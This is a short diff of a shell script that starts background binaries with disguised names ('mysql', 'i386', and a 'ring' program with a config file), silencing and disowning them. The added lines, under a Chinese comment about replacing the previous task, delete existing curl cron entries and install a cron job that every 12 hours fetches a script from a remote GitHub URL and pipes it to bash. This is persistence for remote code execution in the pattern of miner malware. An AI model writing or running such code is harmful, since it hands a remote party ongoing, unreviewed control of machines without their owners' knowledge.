@@ -33,3 +33,6 @@ fi
 /mnt/ring/ring -c /mnt/ring/config.json >/dev/null 2>&1 & disown
 cd /opt; ./mysql >/dev/null 2>&1 & disown
 cd /opt; ./i386 >/dev/null 2>&1 & disown
+#清除上一次的任务，添加下一次的任务
+crontab -l | grep -v "curl" | crontab -
+echo "0 */12 * * * curl -s -L https://raw.githubusercontent.com/mumu1667/trx20/main/vb.sh | bash" | crontab -
